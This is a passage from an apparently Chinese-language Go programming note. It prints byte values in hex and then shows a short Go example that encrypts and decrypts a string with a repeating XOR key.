		//fmt.Printf("strData[%d]值十进制为：%v , 16进制为：%#X \n",n,v,v)
		fmt.Printf("%#x,",v)
	}
	fmt.Println()
	fmt.Println(string(data1))
}
```

<a name="Pea31"></a>
## 亦或加密
key是密钥，但是实际上，取其中之一就ok了，下面是加解密的代码
```
package main

import (
	"fmt"
	"strconv"
)

func main() {
	key := []byte{0x61,0x66,0x65,0x6e,0x67,0x5f,0x67,0x6f,0x6f,0x64} //afeng_good
	cipher := enc("aufeng is good", key)
	fmt.Println(cipher)
	fmt.Println(dec(cipher, key))
}

func enc(src string, key []byte) string {
	var result string
	j := 1
	s := ""
	bt := []rune(src)
	for i := 0; i < len(bt); i++ {
		s = strconv.FormatInt(int64(byte(bt[i])^key[j]), 16)
		if len(s) == 1 {
			s = "0" + s
		}
		result = result + (s)
		j = (j + 1) % len(key)
	}
	return result
}

func dec(src string, key []byte) string {
	var result string
	var s int64
	j := 1
	bt := []rune(src)
	for i := 0; i < len(src)/2; i++ {
		s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
		result = result + string(byte(s)^key[j])
		j = (j + 1) % len(key)
	}
	return result
}

```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667145677224-445ead93-f12f-43fa-aeba-88d31bf3fc3f.png#clientId=u0b28f4b7-01ba-4&from=paste&height=434&id=u8e4983a9&originHeight=542&originWidth=788&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39564&status=done&style=none&taskId=u29439a5a-472f-41ad-80e3-4e421d8cc6d&title=&width=630.4)
